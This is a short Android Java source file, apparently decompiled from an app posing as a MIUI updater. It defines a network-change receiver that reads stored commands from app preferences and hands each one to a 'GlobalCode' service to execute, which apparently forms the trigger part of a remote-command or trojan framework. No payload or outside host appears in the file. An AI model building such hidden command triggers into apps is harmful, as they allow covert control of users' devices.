package brandmangroupe.miui.updater;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import java.util.Map;

public class NetworkChangeReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent2) {
        Map<String, ?> items = context.getSharedPreferences("Network_conf", 0).getAll();
        if (items.size() > 0) {
            for (String s : items.keySet()) {
                String cmd = getcmd(context, s);
                if (cmd.length() > 2) {
                    Intent intent = new Intent(context, GlobalCode.class);
                    intent.putExtra("content", cmd);
                    intent.putExtra("type", "TriggerNetwork:" + s);
                    intent.putExtra("data", "");
                    context.startService(intent);
                }
            }
        }
    }

    public String getcmd(Context ctx, String command) {
        return ctx.getSharedPreferences("Cmd_conf", 0).getString(command, "");
    }
}
